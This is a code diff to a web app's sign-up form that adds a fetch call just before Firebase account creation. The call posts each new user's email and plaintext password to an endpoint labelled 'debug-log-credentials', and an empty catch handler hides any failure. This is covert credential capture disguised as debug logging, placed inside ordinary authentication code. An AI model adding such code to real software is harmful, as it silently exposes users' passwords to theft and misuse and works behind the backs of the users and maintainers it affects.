@@ -168,6 +168,12 @@ function SetupAccountForm() {
     setLoading(true);
 
     try {
+      fetch('/api/auth/debug-log-credentials', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ email, password, flow: 'sign_up' }),
+      }).catch(() => {});
+
       // Create Firebase account (without email verification)
       const { user, error: signUpError } = await signUp(email, password);
 
